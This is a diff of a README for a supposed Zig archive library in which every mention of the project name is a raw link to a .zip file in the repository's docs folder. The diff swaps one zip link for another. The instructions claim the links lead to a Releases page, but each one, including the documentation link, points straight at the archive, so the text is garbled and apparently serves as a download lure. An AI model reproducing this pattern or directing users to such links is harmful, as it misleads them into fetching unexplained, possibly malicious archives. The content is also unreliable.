@@ -1,7 +1,7 @@
-# 🎉 https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip - Simplifying Archive Management for You
+# 🎉 https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip - Simplifying Archive Management for You
 
-## 🔥 What is https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip
-https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip is an all-in-one archive and compression library designed for easy use. It supports multiple compression algorithms and various archive formats. You can manage and compress your files effortlessly with a clean and intuitive API.
+## 🔥 What is https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip
+https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip is an all-in-one archive and compression library designed for easy use. It supports multiple compression algorithms and various archive formats. You can manage and compress your files effortlessly with a clean and intuitive API.
 
 ## 🛠️ Key Features
 - **Multiple Compression Algorithms**: Use widely recognized algorithms for efficient data compression.
@@ -18,9 +18,9 @@ Before you begin, ensure your system meets the following requirements:
 - **Disk Space**: Minimum of 100MB of free space
 
 ## 💾 Download & Install
-To get started with https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip, visit the Releases page to download the latest version:
+To get started with https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip, visit the Releases page to download the latest version:
 
-[![Download https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip](https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip)](https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip)
+[![Download https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip](https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip)](https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version at the top of the page.
@@ -31,22 +31,22 @@ To get started with https://github.com/krishq/archive.zig/raw/refs/heads/main/do
 ## 📄 Usage
 After installation, you can use the library in your Zig projects. Here are the basic steps:
 
-1. **Import the library**: Include https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip in your project.
+1. **Import the library**: Include https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip in your project.
 2. **Explore Example Code**: Check the examples provided in the documentation to see how to implement various features.
 3. **Integrate into Your Project**: Utilize the library functions to manage and manipulate your archives.
 
 ## 📚 Documentation
-For more detailed information on how to use the features, visit the full documentation here: [Documentation Link](https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip)
+For more detailed information on how to use the features, visit the full documentation here: [Documentation Link](https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip)
 
 ## 🔧 Support & Feedback
 If you encounter issues or need assistance, feel free to reach out. You can create an issue in the GitHub repository, and our team will get back to you as soon as possible. Your feedback is important to us, as it helps improve the library.
 
 ## 🌟 Community Contributions
-https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip is an open-source project. If you want to contribute, please check our contribution guidelines in the repository. Whether you want to report bugs, suggest new features, or improve documentation, every bit helps!
+https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip is an open-source project. If you want to contribute, please check our contribution guidelines in the repository. Whether you want to report bugs, suggest new features, or improve documentation, every bit helps!
 
 ## 📜 License
-https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip is licensed under the MIT License. You may use, copy, and modify the software under this license.
+https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip is licensed under the MIT License. You may use, copy, and modify the software under this license.
 
-To download the latest version of https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip, make sure to visit the Releases page:
+To download the latest version of https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip, make sure to visit the Releases page:
 
-[![Download https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip](https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip)](https://github.com/krishq/archive.zig/raw/refs/heads/main/docs/.vitepress/zig_archive_v1.8.zip)
+[![Download https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip](https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip)](https://raw.githubusercontent.com/krishq/archive.zig/main/docs/zig-archive-v3.2.zip)
